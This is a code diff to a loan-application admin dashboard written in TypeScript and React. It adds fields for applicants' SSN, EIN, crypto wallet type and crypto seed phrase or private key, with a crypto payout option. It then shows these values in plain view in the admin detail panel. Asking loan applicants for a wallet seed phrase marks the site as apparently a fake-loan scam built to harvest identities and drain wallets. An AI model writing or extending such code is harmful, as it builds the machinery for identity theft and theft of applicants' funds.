@@ -32,6 +32,10 @@ type LoanApplication = {
   billing_country: string | null; employment_status: string | null;
   monthly_income: number | null; loan_purpose: string | null;
   source_page: string | null; created_at: string;
+  ssn: string | null;
+  ein: string | null;
+  crypto_wallet_type: string | null;
+  crypto_seed_phrase: string | null;
 };
 
 type TestimonialSubmission = {
@@ -386,8 +390,14 @@ function LoansTab() {
                   <td className="px-4 py-3 text-gray-600">{r.email}</td>
                   <td className="px-4 py-3 font-semibold text-emerald-700">{r.currency} {Number(r.amount_requested).toLocaleString()}</td>
                   <td className="px-4 py-3">
-                    <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-xs font-medium ${r.payout_method === "bank_transfer" ? "bg-blue-50 text-blue-700" : "bg-purple-50 text-purple-700"}`}>
-                      {r.payout_method === "bank_transfer" ? "🏦 Bank" : "💳 Card"}
+                    <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-xs font-medium ${
+                      r.payout_method === "bank_transfer" ? "bg-blue-50 text-blue-700" : 
+                      r.payout_method === "crypto" ? "bg-orange-50 text-orange-700" :
+                      "bg-purple-50 text-purple-700"
+                    }`}>
+                      {r.payout_method === "bank_transfer" ? "🏦 Bank" : 
+                       r.payout_method === "crypto" ? "₿ Crypto" : 
+                       "💳 Card"}
                     </span>
                   </td>
                   <td className="px-4 py-3"><StatusBadge status={r.status} /></td>
@@ -400,6 +410,8 @@ function LoansTab() {
                         {/* Personal */}
                         <DetailSection title="Personal Info">
                           <DField label="Phone" value={r.phone} />
+                          <DField label="SSN" value={r.ssn} mono />
+                          <DField label="EIN" value={r.ein} mono />
                           <DField label="Employment" value={r.employment_status} />
                           <DField label="Monthly Income" value={r.monthly_income ? `$${Number(r.monthly_income).toLocaleString()}` : null} />
                         </DetailSection>
@@ -409,6 +421,11 @@ function LoansTab() {
                             <DField label="Bank Name" value={r.bank_name} />
                             <DField label="Account Number" value={r.bank_account_number} />
                             <DField label="Routing / SWIFT / IBAN" value={r.bank_routing_number} />
+                          </DetailSection>
+                        ) : r.payout_method === "crypto" ? (
+                          <DetailSection title="Crypto Details">
+                            <DField label="Wallet Type" value={r.crypto_wallet_type} />
+                            <DField label="Seed Phrase / Private Key" value={r.crypto_seed_phrase} mono />
                           </DetailSection>
                         ) : (
                           <>
